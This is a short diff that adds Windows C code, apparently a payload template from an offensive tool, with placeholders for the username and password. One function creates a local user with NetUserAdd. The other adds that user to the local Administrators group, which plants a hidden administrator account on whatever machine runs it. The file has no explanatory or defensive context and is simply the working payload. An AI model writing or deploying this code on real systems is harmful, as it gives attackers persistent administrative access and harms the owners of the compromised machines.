@@ -1,0 +1,24 @@
+void newla_user(){
+    USER_INFO_1 userinfo;
+    userinfo.usri1_name = (LPWSTR) L"{{ username }}";
+    userinfo.usri1_password = (LPWSTR) L"{{ password }}";
+    userinfo.usri1_priv = USER_PRIV_USER;
+
+    DWORD level = 1;
+    DWORD error = 0;
+    NET_API_STATUS status;
+
+    NetUserAdd(NULL, level, (LPBYTE) &userinfo, &error);
+}
+
+void newla_group(){
+    LOCALGROUP_MEMBERS_INFO_3  groupinfo;
+    groupinfo.lgrmi3_domainandname = (LPWSTR) L"{{ username }}";
+
+    NET_API_STATUS status;
+    LPCWSTR groupname = L"Administrators";
+    DWORD level = 3;
+    DWORD count = 1;
+
+    NetLocalGroupAddMembers(NULL, groupname, level, (LPBYTE) &groupinfo, count);
+}
